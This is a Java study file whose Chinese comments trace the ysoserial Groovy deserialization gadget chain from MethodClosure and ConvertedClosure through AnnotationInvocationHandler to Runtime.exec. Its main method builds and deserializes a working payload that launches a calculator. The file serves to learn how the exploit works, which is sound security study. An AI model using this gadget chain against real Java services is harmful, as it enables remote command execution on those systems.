package com.example.ysoserial_demo;

import com.example.apache_collections.Sell;
import com.example.serialized_test.User;
import groovy.lang.Closure;
import org.codehaus.groovy.runtime.ConvertedClosure;
import org.codehaus.groovy.runtime.MethodClosure;

import java.io.*;
import java.lang.reflect.*;
import java.util.Map;

public class demo_groovy {
    /*
    首先通过ysoserial生成一个序列化文件，并执行查看的错：
    ```java
    File f = new File("/home/uustay/test_groovy.ser");
    ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(f));
    objectInputStream.readObject();

    /\* 报错如下
    Exception in thread "main" java.lang.reflect.UndeclaredThrowableException
        at com.sun.proxy.$Proxy0.entrySet(Unknown Source)
        at sun.reflect.annotation.AnnotationInvocationHandler.readObject(AnnotationInvocationHandler.java:452)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
        at java.lang.reflect.Method.invoke(Method.java:498)

     *\/
    ```

    [MethodClosure.java](https://github.com/apache/groovy/blob/GROOVY_2_3_9/src/main/org/codehaus/groovy/runtime/MethodClosure.java)
    [ConvertedClosure.java](https://github.com/apache/groovy/blob/GROOVY_2_3_9/src/main/org/codehaus/groovy/runtime/ConvertedClosure.java)
    其构造函数及`doCall`函数字义为
    ```java
    public MethodClosure(Object owner, String method) {

    protected Object doCall(Object arguments) {
        return InvokerHelper.invokeMethod(getOwner(), method, arguments);
    }
    ```
    参数某一个实例对像，及一个方法名。 而`doCall`函数则是通过动态代理的方式来执行函数方法
    举例为说
    ```java
        User u = new User("uustay");
        String method = "sayLove";
        Object[] args2 = new Object[]{"zn"};
        MethodClosure methodClosure = new MethodClosure(u, method);
        String uname = (String) ((Closure)methodClosure).call(args2); //User => username=uustay	 sayLove=> zn
        System.out.println(uname);
    ```

    如果要通过`MethodClosure`来执行命令的话，就需要和`CommonCollection`中的`Transformer`一样，生成对应的`runtime`的调用链才行
    看一下`PoC`的生成过程

    首先构造了一个`MethodClosure`作为参数的`ConvertedClosure`， 其`method`为 `entrySet`
    看一下`ConvertedClosure`的定义:
    ```java
    public ConvertedClosure(Closure closure, String method) {
        super(closure);
        this.methodName = method;
    }
    ```

    再看一下其父类[ConversionHandler](https://github.com/apache/groovy/blob/GROOVY_2_3_9/src/main/org/codehaus/groovy/runtime/ConversionHandler.java)
    ```java
    public ConversionHandler(Object delegate) {
        if (delegate == null) throw new IllegalArgumentException("delegate must not be null");
        this.delegate = delegate;
    }

    //invoke函数

    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
        VMPlugin plugin = VMPluginFactory.getPlugin();
        if (plugin.getVersion()>=7 && isDefaultMethod(method)) {
            Object handle = handleCache.get(method);
            if (handle == null) {
                handle = plugin.getInvokeSpecialHandle(method, proxy);
                handleCache.put(method, handle);
            }
            return plugin.invokeHandle(handle, args);
        }

        if (!checkMethod(method)) {
            try {
                return invokeCustom(proxy, method, args);
            } catch (GroovyRuntimeException gre) {
                throw ScriptBytecodeAdapter.unwrap(gre);
            }
        }

        try {
            return method.invoke(this, args);
        } catch (InvocationTargetException ite) {
            throw ite.getTargetException();
        }
    }
    ```

    看一下``的 `call`方法, 也是调用了反射，执行了其中的`doCall`函数
    ```java
    public V call(Object... args) {
        try {
            return (V) getMetaClass().invokeMethod(this,"doCall",args);
        } catch (InvokerInvocationException e) {
            ExceptionUtils.sneakyThrow(e.getCause());
            return null; // unreachable statement
        }  catch (Exception e) {
            return (V) throwRuntimeException(e);
        }
    }
    ```

    根据ysoserail的代码，我们可以写出如下的式子来验证可行性, 但是仍然不能决定，为什么entrySet会执行`command`语句的命令，
    跟
    ```java
        String command = "galculator";
        ConvertedClosure convertedClosure = new ConvertedClosure(new MethodClosure(command, "execute"), "entrySet");
        Map handler = (Map) Proxy.newProxyInstance(convertedClosure.getClass().getClassLoader(), new Class[]{Map.class}, convertedClosure);

        System.out.println(handler.getClass().getName());
        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Override.class, handler);

        byte[] a = do_serialize(invocationHandler);
        Object b = do_unserialize(a);
    ```

    在`CovertedClosure.invokeCustom`函数下断点，在判断methodName 和 method.getNmae()是否一致后，
    进入`Closure`类，并调用其`call`函数，
    ```java
    //metaClass来源是 `registry.getMetaClass(java.lang.String.calss)`
    ```

    `metaClassImple`类的`invokeMethod`
    ```java
    public Object invokeMethod(Object object, String methodName, Object[] originalArguments) {
        return invokeMethod(theClass, object, methodName, originalArguments, false, false);
    }

    public Object invokeMethod(Class sender, Object object, String methodName, Object[] originalArguments, boolean isCallToSuper, boolean fromInsideClass) {
    checkInitalised();
    if (object == null) {
        throw new NullPointerException("Cannot invoke method: " + methodName + " on null object");
    }
    ```
    进入后调用了`metaClassImple.getMethodWithCaching`函数
    ```java
    //method = getMethodWithCaching(sender, methodName, arguments, isCallToSuper);
    public MetaMethod getMethodWithCaching(Class sender, String methodName, Object[] arguments, boolean isCallToSuper) {
        // let's try use the cache to find the method
        if (!isCallToSuper && GroovyCategorySupport.hasCategoryInCurrentThread()) {
            return getMethodWithoutCaching(sender, methodName, MetaClassHelper.convertToTypeArray(arguments), isCallToSuper);
        } else {
            final MetaMethodIndex.Entry e = metaMethodIndex.getMethods(sender, methodName);
            if (e == null)
              return null;

            return isCallToSuper ? getSuperMethodWithCaching(arguments, e) : getNormalMethodWithCaching(arguments, e);
        }
    }
    ```
    并在这两条语句后触发
    ```java
    final MetaClass ownerMetaClass = registry.getMetaClass(ownerClass);
    return ownerMetaClass.invokeMethod(ownerClass, owner, methodName, arguments, false, false);
    ```
    因为这个会调用`dgm$748.class`中的`doMethodInvoke`类
    ```java
    public final Object doMethodInvoke(Object var1, Object[] var2) {
        this.coerceArgumentsToClasses(var2);
        return ProcessGroovyMethods.execute((String)var1);
    }
    ```

    在`ProcessGroovyMethods`中，其`execute`函数为
    ```java
    public static Process execute(final String self) throws IOException {
        return Runtime.getRuntime().exec(self);
    }
    ```
    整个链和之报错是一致的。
    也就是说，虽然没有主动生成`Runtime`类的，但是通过`MethodClosure`的`metaClass`的`invoke`不停的调用，
    最终将 `command`以参数的形式传入了`ProcessGroovyMethods.execute`中
    而 `AnnotationInvocationHandler`的 `memberValues`中所调用的`entrySet`， 这也是最后将生成的代理类`handler`
    作为`AnnotationInvocationHandler`的构造参数之一的原因。

    参考： https://paper.seebug.org/1171/


     */

    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException {
//        String str = "test";
//        String cmd = "galculator";
//        MethodClosure methodClosure = new MethodClosure(str, "execute");
//        ((Closure)methodClosure).call(cmd);



//        File f = new File("/home/uustay/test_groovy.ser");
//        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(f));
//        objectInputStream.readObject();

        User u = new User("uustay");
        String method = "sayLove";
        Object[] args2 = new Object[]{"zn"};
        MethodClosure methodClosure = new MethodClosure(u, method);
        String uname = (String) ((Closure)methodClosure).call(args2);
        System.out.println(uname);

        String command = "galculator";
        ConvertedClosure convertedClosure = new ConvertedClosure(new MethodClosure(command, "execute"), "entrySet");
        Map handler = (Map) Proxy.newProxyInstance(convertedClosure.getClass().getClassLoader(), new Class[]{Map.class}, convertedClosure);

        System.out.println(handler.getClass().getName());
        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Override.class, handler);

        byte[] a = do_serialize(invocationHandler);
        Object b = do_unserialize(a);

    }



    public static byte[]  do_serialize(Object obj) throws IOException {
        ByteArrayOutputStream btout = new ByteArrayOutputStream();

        ObjectOutputStream oos = new ObjectOutputStream(btout);
        oos.writeObject(obj);
        System.out.println("do serialized success");
        return btout.toByteArray();
    }

    public static Object do_unserialize(byte[] data) throws IOException, ClassNotFoundException {
        ByteArrayInputStream btin = new ByteArrayInputStream(data);
        ObjectInputStream ooi = new ObjectInputStream(btin);

        System.out.println("do unserialized success");
        return ooi.readObject();
    }
}
